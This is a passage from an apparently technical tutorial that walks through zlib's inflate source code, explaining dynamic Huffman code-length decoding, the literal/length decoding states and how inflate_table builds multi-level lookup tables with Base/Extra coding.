            state<span>-&gt;</span>lencode <span>=</span> state<span>-&gt;</span>distcode <span>=</span> <span>(</span><span>const</span> code FAR <span>*</span><span>)</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>;</span>
            state<span>-&gt;</span>lenbits <span>=</span> <span>7</span><span>;</span>
            ret <span>=</span> <span>inflate_table</span><span>(</span>CODES<span>,</span> state<span>-&gt;</span>lens<span>,</span> <span>19</span><span>,</span> <span>&amp;</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>,</span>
                                <span>&amp;</span><span>(</span>state<span>-&gt;</span>lenbits<span>)</span><span>,</span> state<span>-&gt;</span>work<span>)</span><span>;</span>
            <span>if</span> <span>(</span>ret<span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid code lengths set&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>Tracev</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:       code lengths ok\n&#34;</span><span>)</span><span>)</span><span>;</span>
            state<span>-&gt;</span>have <span>=</span> <span>0</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> CODELENS<span>;</span>
                <span>/* fallthrough */</span></code></pre>
<p>First, we read the Code Huffman table lengths. We loop <code>state-&gt;ncode</code> times and read 3 bits each time into <code>state-&gt;lens</code>. These 3-bit values are code lengths—the Huffman table is represented by lengths, not the full bit patterns, as discussed earlier. Thus, <code>state-&gt;lens</code> records the Code Huffman table’s code lengths in the <code>order</code> permutation.</p>
<pre><code><span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> order<span>[</span><span>19</span><span>]</span> <span>=</span> <span>/* permutation of code lengths */</span>
        <span>{</span><span>16</span><span>,</span> <span>17</span><span>,</span> <span>18</span><span>,</span> <span>0</span><span>,</span> <span>8</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>,</span> <span>6</span><span>,</span> <span>10</span><span>,</span> <span>5</span><span>,</span> <span>11</span><span>,</span> <span>4</span><span>,</span> <span>12</span><span>,</span> <span>3</span><span>,</span> <span>13</span><span>,</span> <span>2</span><span>,</span> <span>14</span><span>,</span> <span>1</span><span>,</span> <span>15</span><span>}</span><span>;</span></code></pre>
<p>Here, <code>order</code> reduces the size of the encoded Code Huffman table. The Code table decodes original values 0–18. Storing lengths for all 19 values would be inefficient.</p>
<p>Typically, codes are used more frequently in the same order as <code>order</code>. If we stored lengths in plain 0–18 order, we’d need to write zeros for many unused values (e.g., 0–15) before the frequently used 16, 17, 18. By ordering them as above, we can store just the lengths for the frequently used codes and leave the rest implicit. The code reflects this: it reads <code>state-&gt;ncode</code> lengths, and sets the remaining entries to zero.</p>
<p>We then set <code>state-&gt;next</code> to point into <code>state-&gt;codes</code>, and call <code>inflate_table</code> to build the Huffman table. The resulting table is written at <code>state-&gt;next</code> (<code>state-&gt;lencode</code>). We’ll cover <code>inflate_table</code> shortly. For now, note the parameters: <code>CODES</code> (build the Code table), <code>state-&gt;lens</code> (length array), <code>19</code> (number of symbols, 0–18), <code>&amp;(state-&gt;next)</code> (output pointer for the constructed table), <code>&amp;(state-&gt;lenbits)</code> (table index bit width—initially 7, but may be adjusted by <code>inflate_table</code>), and <code>state-&gt;work</code> (a temporary array for sorting).</p>
<pre><code>        <span>case</span> CODELENS<span>:</span>
            <span>while</span> <span>(</span>state<span>-&gt;</span>have <span>&lt;</span> state<span>-&gt;</span>nlen <span>+</span> state<span>-&gt;</span>ndist<span>)</span> <span>{</span>
                <span>for</span> <span>(</span><span>;</span><span>;</span><span>)</span> <span>{</span>
                    here <span>=</span> state<span>-&gt;</span>lencode<span>[</span><span>BITS</span><span>(</span>state<span>-&gt;</span>lenbits<span>)</span><span>]</span><span>;</span>
                    <span>if</span> <span>(</span><span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>.</span>bits<span>)</span> <span>&lt;=</span> bits<span>)</span> <span>break</span><span>;</span>
                    <span>PULLBYTE</span><span>(</span><span>)</span><span>;</span>
                <span>}</span>
                <span>if</span> <span>(</span>here<span>.</span>val <span>&lt;</span> <span>16</span><span>)</span> <span>{</span>
                    <span>DROPBITS</span><span>(</span>here<span>.</span>bits<span>)</span><span>;</span>
                    state<span>-&gt;</span>lens<span>[</span>state<span>-&gt;</span>have<span>++</span><span>]</span> <span>=</span> here<span>.</span>val<span>;</span>
                <span>}</span>
                <span>else</span> <span>{</span>
                    <span>if</span> <span>(</span>here<span>.</span>val <span>==</span> <span>16</span><span>)</span> <span>{</span>
                        <span>NEEDBITS</span><span>(</span>here<span>.</span>bits <span>+</span> <span>2</span><span>)</span><span>;</span>
                        <span>DROPBITS</span><span>(</span>here<span>.</span>bits<span>)</span><span>;</span>
                        <span>if</span> <span>(</span>state<span>-&gt;</span>have <span>==</span> <span>0</span><span>)</span> <span>{</span>
                            strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid bit length repeat&#34;</span><span>;</span>
                            state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                            <span>break</span><span>;</span>
                        <span>}</span>
                        len <span>=</span> state<span>-&gt;</span>lens<span>[</span>state<span>-&gt;</span>have <span>-</span> <span>1</span><span>]</span><span>;</span>
                        copy <span>=</span> <span>3</span> <span>+</span> <span>BITS</span><span>(</span><span>2</span><span>)</span><span>;</span>
                        <span>DROPBITS</span><span>(</span><span>2</span><span>)</span><span>;</span>
                    <span>}</span>
                    <span>else</span> <span>if</span> <span>(</span>here<span>.</span>val <span>==</span> <span>17</span><span>)</span> <span>{</span>
                        <span>NEEDBITS</span><span>(</span>here<span>.</span>bits <span>+</span> <span>3</span><span>)</span><span>;</span>
                        <span>DROPBITS</span><span>(</span>here<span>.</span>bits<span>)</span><span>;</span>
                        len <span>=</span> <span>0</span><span>;</span>
                        copy <span>=</span> <span>3</span> <span>+</span> <span>BITS</span><span>(</span><span>3</span><span>)</span><span>;</span>
                        <span>DROPBITS</span><span>(</span><span>3</span><span>)</span><span>;</span>
                    <span>}</span>
                    <span>else</span> <span>{</span>
                        <span>NEEDBITS</span><span>(</span>here<span>.</span>bits <span>+</span> <span>7</span><span>)</span><span>;</span>
                        <span>DROPBITS</span><span>(</span>here<span>.</span>bits<span>)</span><span>;</span>
                        len <span>=</span> <span>0</span><span>;</span>
                        copy <span>=</span> <span>11</span> <span>+</span> <span>BITS</span><span>(</span><span>7</span><span>)</span><span>;</span>
                        <span>DROPBITS</span><span>(</span><span>7</span><span>)</span><span>;</span>
                    <span>}</span>
                    <span>if</span> <span>(</span>state<span>-&gt;</span>have <span>+</span> copy <span>&gt;</span> state<span>-&gt;</span>nlen <span>+</span> state<span>-&gt;</span>ndist<span>)</span> <span>{</span>
                        strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid bit length repeat&#34;</span><span>;</span>
                        state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                        <span>break</span><span>;</span>
                    <span>}</span>
                    <span>while</span> <span>(</span>copy<span>--</span><span>)</span>
                        state<span>-&gt;</span>lens<span>[</span>state<span>-&gt;</span>have<span>++</span><span>]</span> <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span>len<span>;</span>
                <span>}</span>
            <span>}</span>

            <span>/* handle error breaks in while */</span>
            <span>if</span> <span>(</span>state<span>-&gt;</span>mode <span>==</span> BAD<span>)</span> <span>break</span><span>;</span>

            <span>/* check for end-of-block code (better have one) */</span>
            <span>if</span> <span>(</span>state<span>-&gt;</span>lens<span>[</span><span>256</span><span>]</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid code -- missing end-of-block&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>

            <span>/* build code tables -- note: do not change the lenbits or distbits
               values here (9 and 6) without reading the comments in inftrees.h
               concerning the ENOUGH constants, which depend on those values */</span>
            state<span>-&gt;</span>next <span>=</span> state<span>-&gt;</span>codes<span>;</span>
            state<span>-&gt;</span>lencode <span>=</span> <span>(</span><span>const</span> code FAR <span>*</span><span>)</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>;</span>
            state<span>-&gt;</span>lenbits <span>=</span> <span>9</span><span>;</span>
            ret <span>=</span> <span>inflate_table</span><span>(</span>LENS<span>,</span> state<span>-&gt;</span>lens<span>,</span> state<span>-&gt;</span>nlen<span>,</span> <span>&amp;</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>,</span>
                                <span>&amp;</span><span>(</span>state<span>-&gt;</span>lenbits<span>)</span><span>,</span> state<span>-&gt;</span>work<span>)</span><span>;</span>
            <span>if</span> <span>(</span>ret<span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid literal/lengths set&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            state<span>-&gt;</span>distcode <span>=</span> <span>(</span><span>const</span> code FAR <span>*</span><span>)</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>;</span>
            state<span>-&gt;</span>distbits <span>=</span> <span>6</span><span>;</span>
            ret <span>=</span> <span>inflate_table</span><span>(</span>DISTS<span>,</span> state<span>-&gt;</span>lens <span>+</span> state<span>-&gt;</span>nlen<span>,</span> state<span>-&gt;</span>ndist<span>,</span>
                            <span>&amp;</span><span>(</span>state<span>-&gt;</span>next<span>)</span><span>,</span> <span>&amp;</span><span>(</span>state<span>-&gt;</span>distbits<span>)</span><span>,</span> state<span>-&gt;</span>work<span>)</span><span>;</span>
            <span>if</span> <span>(</span>ret<span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid distances set&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>Tracev</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:       codes ok\n&#34;</span><span>)</span><span>)</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> LEN_<span>;</span>
            <span>if</span> <span>(</span>flush <span>==</span> Z_TREES<span>)</span> <span>goto</span> inf_leave<span>;</span>
                <span>/* fallthrough */</span></code></pre>
<p>Once the Code table is built, we decode the compressed lengths of the Literal/Length and Distance tables. We read <code>state-&gt;lenbits</code> bits and use the Code table <code>state-&gt;lencode</code> to decode entries, retrieving a <code>code</code> struct from the table.</p>
<p>Values 0–18 decoded via the Code table are not literal decoded bytes. Based on the code, they behave as follows:</p>
<blockquote>
<ul>
<li>0–15: literal code lengths 0–15 directly</li>
<li>16: repeat previous length 3–6 times</li>
<li>17: repeat length 0, 3–10 times</li>
<li>18: repeat length 0, 11–138 times</li>
</ul>
</blockquote>
<p>Here “original value” refers to the value decoded by Huffman coding, not necessarily the final decompressed byte. Some values (0–15) correspond to actual lengths, others (16–18) are special symbols.</p>
<pre><code>code here<span>;</span></code></pre>
<p>We’ll explain this struct in the Huffman table construction section. Depending on its members, various actions occur to ultimately decode each value.</p>
<p>As before, we call <code>inflate_table</code> to build the final <code>state-&gt;lencode</code> and <code>state-&gt;distcode</code> tables for Literal/Length and Distance respectively.</p>
<blockquote>
<p>The Code table is no longer needed, so overwriting <code>state-&gt;lencode</code> is fine.</p>
</blockquote>
<pre><code>        <span>case</span> LEN<span>:</span>
            <span>if</span> <span>(</span>have <span>&gt;=</span> <span>6</span> <span>&amp;&amp;</span> left <span>&gt;=</span> <span>258</span><span>)</span> <span>{</span>
                <span>RESTORE</span><span>(</span><span>)</span><span>;</span>
                <span>inflate_fast</span><span>(</span>strm<span>,</span> out<span>)</span><span>;</span>
                <span>LOAD</span><span>(</span><span>)</span><span>;</span>
                <span>if</span> <span>(</span>state<span>-&gt;</span>mode <span>==</span> TYPE<span>)</span>
                    state<span>-&gt;</span>back <span>=</span> <span>-</span><span>1</span><span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            state<span>-&gt;</span>back <span>=</span> <span>0</span><span>;</span>
            <span>for</span> <span>(</span><span>;</span><span>;</span><span>)</span> <span>{</span>
                here <span>=</span> state<span>-&gt;</span>lencode<span>[</span><span>BITS</span><span>(</span>state<span>-&gt;</span>lenbits<span>)</span><span>]</span><span>;</span>
                <span>if</span> <span>(</span><span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>.</span>bits<span>)</span> <span>&lt;=</span> bits<span>)</span> <span>break</span><span>;</span>
                <span>PULLBYTE</span><span>(</span><span>)</span><span>;</span>
            <span>}</span>
            <span>if</span> <span>(</span>here<span>.</span>op <span>&amp;&amp;</span> <span>(</span>here<span>.</span>op <span>&amp;</span> <span>0xf0</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
                last <span>=</span> here<span>;</span>
                <span>for</span> <span>(</span><span>;</span><span>;</span><span>)</span> <span>{</span>
                    here <span>=</span> state<span>-&gt;</span>lencode<span>[</span>last<span>.</span>val <span>+</span>
                            <span>(</span><span>BITS</span><span>(</span>last<span>.</span>bits <span>+</span> last<span>.</span>op<span>)</span> <span>&gt;&gt;</span> last<span>.</span>bits<span>)</span><span>]</span><span>;</span>
                    <span>if</span> <span>(</span><span>(</span><span>unsigned</span><span>)</span><span>(</span>last<span>.</span>bits <span>+</span> here<span>.</span>bits<span>)</span> <span>&lt;=</span> bits<span>)</span> <span>break</span><span>;</span>
                    <span>PULLBYTE</span><span>(</span><span>)</span><span>;</span>
                <span>}</span>
                <span>DROPBITS</span><span>(</span>last<span>.</span>bits<span>)</span><span>;</span>
                state<span>-&gt;</span>back <span>+=</span> last<span>.</span>bits<span>;</span>
            <span>}</span>
            <span>DROPBITS</span><span>(</span>here<span>.</span>bits<span>)</span><span>;</span>
            state<span>-&gt;</span>back <span>+=</span> here<span>.</span>bits<span>;</span>
            state<span>-&gt;</span>length <span>=</span> <span>(</span><span>unsigned</span><span>)</span>here<span>.</span>val<span>;</span>
            <span>if</span> <span>(</span><span>(</span><span>int</span><span>)</span><span>(</span>here<span>.</span>op<span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
                <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> here<span>.</span>val <span>&gt;=</span> <span>0x20</span> <span>&amp;&amp;</span> here<span>.</span>val <span>&lt;</span> <span>0x7f</span> <span>?</span>
                        <span>&#34;inflate:         literal &#39;%c&#39;\n&#34;</span> <span>:</span>
                        <span>&#34;inflate:         literal 0x%02x\n&#34;</span><span>,</span> here<span>.</span>val<span>)</span><span>)</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> LIT<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>if</span> <span>(</span>here<span>.</span>op <span>&amp;</span> <span>32</span><span>)</span> <span>{</span>
                <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         end of block\n&#34;</span><span>)</span><span>)</span><span>;</span>
                state<span>-&gt;</span>back <span>=</span> <span>-</span><span>1</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> TYPE<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>if</span> <span>(</span>here<span>.</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid literal/length code&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            state<span>-&gt;</span>extra <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>.</span>op<span>)</span> <span>&amp;</span> <span>15</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> LENEXT<span>;</span>
                <span>/* fallthrough */</span></code></pre>
<p>We now enter the decoding process. Again, we fetch a <code>code</code> from the table and take actions based on its fields to decode the original value.</p>
<pre><code>        <span>case</span> LIT<span>:</span>
            <span>if</span> <span>(</span>left <span>==</span> <span>0</span><span>)</span> <span>goto</span> inf_leave<span>;</span>
            <span>*</span>put<span>++</span> <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span>state<span>-&gt;</span>length<span>)</span><span>;</span>
            left<span>--</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> LEN<span>;</span>
            <span>break</span><span>;</span></code></pre>
<p>A quick check shows that when <code>here.op == 0</code>, we switch to <code>state-&gt;mode = LIT</code> and append <code>here.val</code> (the literal byte) to <code>strm-&gt;next_out</code> (<code>put</code>). Also, <code>here.bits</code> is the number of bits consumed to decode that symbol; i.e., it’s the code length, and the decoder uses <code>DROPBITS(here.bits)</code> to consume bits. This is standard Huffman decoding. But there are other decoding forms depending on <code>here.op</code>—we’ll explain this in the table construction section.</p>
<pre><code>        <span>case</span> LEN<span>:</span>
            <span>if</span> <span>(</span>have <span>&gt;=</span> <span>6</span> <span>&amp;&amp;</span> left <span>&gt;=</span> <span>258</span><span>)</span> <span>{</span>
                <span>RESTORE</span><span>(</span><span>)</span><span>;</span>
                <span>inflate_fast</span><span>(</span>strm<span>,</span> out<span>)</span><span>;</span>
                <span>LOAD</span><span>(</span><span>)</span><span>;</span>
                <span>if</span> <span>(</span>state<span>-&gt;</span>mode <span>==</span> TYPE<span>)</span>
                    state<span>-&gt;</span>back <span>=</span> <span>-</span><span>1</span><span>;</span>
                <span>break</span><span>;</span>
            <span>}</span></code></pre>
<p>Back to the code snippet above. If <code>have</code> and <code>left</code> are large enough, <code>inflate</code> calls <code>inflate_fast</code> for high-speed decoding. The in-function Huffman decoding is slower because it transitions through VM-like states; <code>inflate_fast</code> operates with full buffers and fewer checks. Therefore, <code>inflate_fast</code> requires sufficiently large input/output buffers to be safe.</p>
<h2 id="3-2-huffman-table">3-2. Huffman Table</h2>
<pre><code><span>int</span> ZLIB_INTERNAL <span>inflate_table</span><span>(</span>codetype type<span>,</span> <span>unsigned</span> <span>short</span> FAR <span>*</span>lens<span>,</span>
                                <span>unsigned</span> codes<span>,</span> code FAR <span>*</span> FAR <span>*</span>table<span>,</span>
                                <span>unsigned</span> FAR <span>*</span>bits<span>,</span> <span>unsigned</span> <span>short</span> FAR <span>*</span>work<span>)</span> <span>{</span></code></pre>
<p>Let’s revisit <code>inflate_table</code>’s parameters:</p>
<blockquote>
<ul>
<li><code>codetype type</code>: table type (Code, Literal/Length, Distance)</li>
</ul>
</blockquote>
<ul>
<li><code>unsigned short FAR *lens</code>: array of code lengths</li>
<li><code>unsigned codes</code>: number of symbols (table entries)</li>
<li><code>code FAR * FAR *table</code>: output pointer to the constructed table</li>
<li><code>unsigned FAR *bits</code>: pointer to the number of index bits for the table (may be adjusted)</li>
<li><code>unsigned short FAR *work</code>: scratch array for sorting, etc.</li>
</ul>
<pre><code><span>typedef</span> <span>struct</span> <span>{</span>
    <span>unsigned</span> <span>char</span> op<span>;</span>           <span>/* operation, extra bits, table bits */</span>
    <span>unsigned</span> <span>char</span> bits<span>;</span>         <span>/* bits in this part of the code */</span>
    <span>unsigned</span> <span>short</span> val<span>;</span>         <span>/* offset in table or code value */</span>
<span>}</span> code<span>;</span>

<span>/* op values as set by inflate_table():
    00000000 - literal
    0000tttt - table link, tttt != 0 is the number of table index bits
    0001eeee - length or distance, eeee is the number of extra bits
    01100000 - end of block
    01000000 - invalid code
 */</span></code></pre>
<p>Now, the <code>code</code> struct. The Huffman table is an array of <code>code</code> structs; <code>op</code> determines how to decode, <code>bits</code> is the code length, and <code>val</code> holds the value. As the comment indicates, these fields can play different roles depending on <code>op</code>.</p>
<pre><code>
    <span>/* accumulate lengths for codes (assumes lens[] all in 0..MAXBITS) */</span>
    <span>for</span> <span>(</span>len <span>=</span> <span>0</span><span>;</span> len <span>&lt;=</span> MAXBITS<span>;</span> len<span>++</span><span>)</span>
        count<span>[</span>len<span>]</span> <span>=</span> <span>0</span><span>;</span>
    <span>for</span> <span>(</span>sym <span>=</span> <span>0</span><span>;</span> sym <span>&lt;</span> codes<span>;</span> sym<span>++</span><span>)</span>
        count<span>[</span>lens<span>[</span>sym<span>]</span><span>]</span><span>++</span><span>;</span>

    <span>/* bound code lengths, force root to be within code lengths */</span>
    root <span>=</span> <span>*</span>bits<span>;</span>
    <span>for</span> <span>(</span>max <span>=</span> MAXBITS<span>;</span> max <span>&gt;=</span> <span>1</span><span>;</span> max<span>--</span><span>)</span>
        <span>if</span> <span>(</span>count<span>[</span>max<span>]</span> <span>!=</span> <span>0</span><span>)</span> <span>break</span><span>;</span>
    <span>if</span> <span>(</span>root <span>&gt;</span> max<span>)</span> root <span>=</span> max<span>;</span>
    <span>if</span> <span>(</span>max <span>==</span> <span>0</span><span>)</span> <span>{</span>                     <span>/* no symbols to code at all */</span>
        here<span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>64</span><span>;</span>    <span>/* invalid code marker */</span>
        here<span>.</span>bits <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>1</span><span>;</span>
        here<span>.</span>val <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span><span>0</span><span>;</span>
        <span>*</span><span>(</span><span>*</span>table<span>)</span><span>++</span> <span>=</span> here<span>;</span>             <span>/* make a table to force an error */</span>
        <span>*</span><span>(</span><span>*</span>table<span>)</span><span>++</span> <span>=</span> here<span>;</span>
        <span>*</span>bits <span>=</span> <span>1</span><span>;</span>
        <span>return</span> <span>0</span><span>;</span>     <span>/* no symbols, but wait for decoding to report error */</span>
    <span>}</span>
    <span>for</span> <span>(</span>min <span>=</span> <span>1</span><span>;</span> min <span>&lt;</span> max<span>;</span> min<span>++</span><span>)</span>
        <span>if</span> <span>(</span>count<span>[</span>min<span>]</span> <span>!=</span> <span>0</span><span>)</span> <span>break</span><span>;</span>
    <span>if</span> <span>(</span>root <span>&lt;</span> min<span>)</span> root <span>=</span> min<span>;</span>

    <span>/* generate offsets into symbol table for each length for sorting */</span>
    offs<span>[</span><span>1</span><span>]</span> <span>=</span> <span>0</span><span>;</span>
    <span>for</span> <span>(</span>len <span>=</span> <span>1</span><span>;</span> len <span>&lt;</span> MAXBITS<span>;</span> len<span>++</span><span>)</span>
        offs<span>[</span>len <span>+</span> <span>1</span><span>]</span> <span>=</span> offs<span>[</span>len<span>]</span> <span>+</span> count<span>[</span>len<span>]</span><span>;</span>

    <span>/* sort symbols by length, by symbol order within each length */</span>
    <span>for</span> <span>(</span>sym <span>=</span> <span>0</span><span>;</span> sym <span>&lt;</span> codes<span>;</span> sym<span>++</span><span>)</span>
        <span>if</span> <span>(</span>lens<span>[</span>sym<span>]</span> <span>!=</span> <span>0</span><span>)</span> work<span>[</span>offs<span>[</span>lens<span>[</span>sym<span>]</span><span>]</span><span>++</span><span>]</span> <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span>sym<span>;</span></code></pre>
<p>Let’s step through table construction. First we count, for each code length, how many symbols use that length.</p>
<p>We then determine the minimum and maximum code lengths from <code>count</code> and set <code>root</code>, the table’s index bit width. <code>root</code> initially comes from the <code>bits</code> argument but may be adjusted based on min/max. That’s why <code>bits</code> is a pointer: any adjustments made in <code>inflate_table</code> must also be visible to the caller.</p>
<p>The Huffman table is a simple 1D array, indexed by bits: <code>table[huffman_code] = decoded_value (actually a code struct to decode it)</code>. Thus, <code>root</code> is really the number of index bits—i.e., the size of the primary table. If <code>root=7</code>, the table has entries up to <code>table[127(0b1111111)]</code>.</p>
<p>If <code>root &gt; max</code>, set <code>root = max</code> to avoid wasting space. If <code>root &lt; min</code>, set <code>root = min</code>; otherwise you couldn’t store any codes at all.</p>
<p>But if <code>root = min</code>, how do we store codes longer than <code>root</code>? Using multi-level tables. As we’ve seen, the <code>op</code> field can indicate a second-level lookup. For example, suppose there are ten 8‑bit codes and one 9‑bit code. You don’t want to double the table size (from 256 to 512 entries) just for one symbol. So the primary table has 256 entries; all 8‑bit codes and the <em>prefixes</em> of any longer codes are stored there. For longer codes, entries in the primary table point to sub-tables that hold the remaining bits.</p>
<p>We’ll see the exact mechanics below.</p>
<p>Once <code>root</code> is decided, we build the <code>offs</code> array to sort symbols by code length and symbol order into <code>work</code>. The <code>work</code> array is needed to reconstruct the full Huffman codes from the lengths.</p>
<pre><code>A -&gt; 2 (00)
B -&gt; 3 (110)
C -&gt; 2 (01)
D -&gt; 2 (10)
E -&gt; 3 (111)</code></pre>
<p>To reconstruct codes from lengths, group symbols with the same length and assign codes in order:</p>
<pre><code>A -&gt; 2 (00)
C -&gt; 2 (01)
D -&gt; 2 (10)
B -&gt; 3 (110)
E -&gt; 3 (111)</code></pre>
<p><code>work</code> is the array that encodes this ordering; the build loop will walk <code>work</code> to assign codes.</p>
<pre><code>    <span>/* set up for code type */</span>
    <span>switch</span> <span>(</span>type<span>)</span> <span>{</span>
    <span>case</span> CODES<span>:</span>
        base <span>=</span> extra <span>=</span> work<span>;</span>    <span>/* dummy value--not used */</span>
        match <span>=</span> <span>20</span><span>;</span>
        <span>break</span><span>;</span>
    <span>case</span> LENS<span>:</span>
        base <span>=</span> lbase<span>;</span>
        extra <span>=</span> lext<span>;</span>
        match <span>=</span> <span>257</span><span>;</span>
        <span>break</span><span>;</span>
    <span>default</span><span>:</span>    <span>/* DISTS */</span>
        base <span>=</span> dbase<span>;</span>
        extra <span>=</span> dext<span>;</span>
        match <span>=</span> <span>0</span><span>;</span>
    <span>}</span></code></pre>
<p>Depending on <code>type</code>, we set <code>match</code>, <code>base</code>, and <code>extra</code>. These support the Base/Extra decoding mode described below.</p>
<p>Dynamic Huffman table lengths in the stream are usually stored by position (index), since that index is the original value—e.g., index 65 corresponds to ‘A’. This is efficient for literals (0–255). But what about LZ77 length/distance values? Deflate specifies length range 3–258 and distance range 1–32,768, making a direct per‑value table impractical. So lengths and distances use Base/Extra coding.</p>
<p><code>match</code> indicates where Base/Extra decoding begins. For Literal/Length, 0–255 are literals and 256 is End of Block; from 257 upward (LZ77 lengths), Base/Extra applies—so <code>match=257</code>. The Code table doesn’t use Base/Extra at all, so <code>match=20</code> (greater than the largest code index). Distance uses Base/Extra for all symbols, so <code>match=0</code>.</p>
<p><code>base</code> and <code>extra</code> select the arrays used for Base/Extra depending on whether we’re building the length or distance table.</p>
<pre><code>    <span>/* initialize state for loop */</span>
    huff <span>=</span> <span>0</span><span>;</span>                   <span>/* starting code */</span>
    sym <span>=</span> <span>0</span><span>;</span>                    <span>/* starting code symbol */</span>
    len <span>=</span> min<span>;</span>                  <span>/* starting code length */</span>
    next <span>=</span> <span>*</span>table<span>;</span>              <span>/* current table to fill in */</span>
    curr <span>=</span> root<span>;</span>                <span>/* current table index bits */</span>
    drop <span>=</span> <span>0</span><span>;</span>                   <span>/* current bits to drop from code for index */</span>
    low <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span><span>-</span><span>1</span><span>)</span><span>;</span>       <span>/* trigger new sub-table when len &gt; root */</span>
    used <span>=</span> <span>1U</span> <span>&lt;&lt;</span> root<span>;</span>          <span>/* use root table entries */</span>
    mask <span>=</span> used <span>-</span> <span>1</span><span>;</span>            <span>/* mask for comparing low */</span>

    <span>/* process all codes and make table entries */</span>
    <span>for</span> <span>(</span><span>;</span><span>;</span><span>)</span> <span>{</span>
        <span>/* create table entry */</span>
        here<span>.</span>bits <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span>len <span>-</span> drop<span>)</span><span>;</span>
        <span>if</span> <span>(</span>work<span>[</span>sym<span>]</span> <span>+</span> <span>1U</span> <span>&lt;</span> match<span>)</span> <span>{</span>
            here<span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>0</span><span>;</span>
            here<span>.</span>val <span>=</span> work<span>[</span>sym<span>]</span><span>;</span>
        <span>}</span>
        <span>else</span> <span>if</span> <span>(</span>work<span>[</span>sym<span>]</span> <span>&gt;=</span> match<span>)</span> <span>{</span>
            here<span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span>extra<span>[</span>work<span>[</span>sym<span>]</span> <span>-</span> match<span>]</span><span>)</span><span>;</span>
            here<span>.</span>val <span>=</span> base<span>[</span>work<span>[</span>sym<span>]</span> <span>-</span> match<span>]</span><span>;</span>
        <span>}</span>
        <span>else</span> <span>{</span>
            here<span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span><span>32</span> <span>+</span> <span>64</span><span>)</span><span>;</span>         <span>/* end of block */</span>
            here<span>.</span>val <span>=</span> <span>0</span><span>;</span>
        <span>}</span>
</code></pre>
<p>This is the main construction loop. We iterate through <code>work</code>, creating a <code>code</code> entry for each symbol. If <code>symbol+1 &lt; match</code>, it’s a normal entry: <code>op=0</code>, <code>val=symbol</code>. As we saw in <code>case LIT:</code>, decoding such an entry emits <code>val</code>.</p>
<blockquote>
<p>Recall: “original value” here means the Huffman-decoded value. In the simple case above, it’s the final literal; with Base/Extra, it’s a special symbol that needs further interpretation.</p>
</blockquote>
<p>If <code>symbol &gt;= match</code>, we create an entry using the Base/Extra scheme: <code>op</code> holds the number of extra bits, <code>val</code> holds the base.</p>
<pre><code>            state<span>-&gt;</span>length <span>=</span> <span>(</span><span>unsigned</span><span>)</span>here<span>.</span>val<span>;</span>
